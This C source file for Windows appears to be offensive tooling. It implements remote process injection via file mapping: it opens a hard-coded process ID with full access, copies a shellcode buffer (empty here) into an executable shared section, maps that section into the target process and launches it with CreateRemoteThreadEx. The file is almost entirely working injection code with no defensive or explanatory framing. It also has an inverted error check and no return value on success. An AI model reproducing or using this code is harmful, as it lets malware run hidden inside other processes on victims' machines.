#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <memoryapi.h>





BOOL LocalmappingInjection(SIZE_T szpayload, unsigned char* payload);

int main() {


	unsigned char shellcode[] = {	
		
 };


	unsigned char* payload = shellcode;


	SIZE_T szpayload = sizeof(shellcode);
	LocalmappingInjection(szpayload, payload);


	printf("press enter to exit");
	getchar();
}

BOOL LocalmappingInjection(SIZE_T szpayload,unsigned char* payload) {


	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 11424);

	if (hprocess != NULL) {
		printf("The openprocess failed with error no %d", GetLastError());
	}
	HANDLE hfile = NULL;

	hfile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL,(DWORD) szpayload, NULL);

	if (hfile == NULL) {
		printf("The createfilemapping failed with error no %d", GetLastError());
		return FALSE;
	}
	
	else {
		PVOID pmapaddress = MapViewOfFile(hfile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL,szpayload);

		if (pmapaddress == NULL) {
			printf("the mapviewoffile failed with error no %d\n", GetLastError());
		}
		else {

			printf("The process is mapped at %p", pmapaddress);
			//getchar();


			memcpy(pmapaddress, payload,szpayload);

			/*getchar();*/

			PVOID premoteaddress =  MapViewOfFile2(hfile, hprocess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);

			

			if (premoteaddress == NULL) {
				printf("The mapviewoffile2 failed with error no %d", GetLastError());
			}

			else {
				CreateRemoteThreadEx(hprocess, NULL, NULL, premoteaddress, NULL, NULL, NULL, NULL);
			}
		}
	}
	
}
